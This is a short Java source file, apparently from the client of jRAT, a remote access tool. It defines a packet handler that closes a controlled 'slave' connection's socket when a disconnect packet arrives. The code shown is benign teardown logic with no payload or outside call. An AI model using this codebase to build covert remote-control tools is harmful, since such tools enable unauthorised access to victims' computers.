package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.exceptions.CloseException;


public class Packet12Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}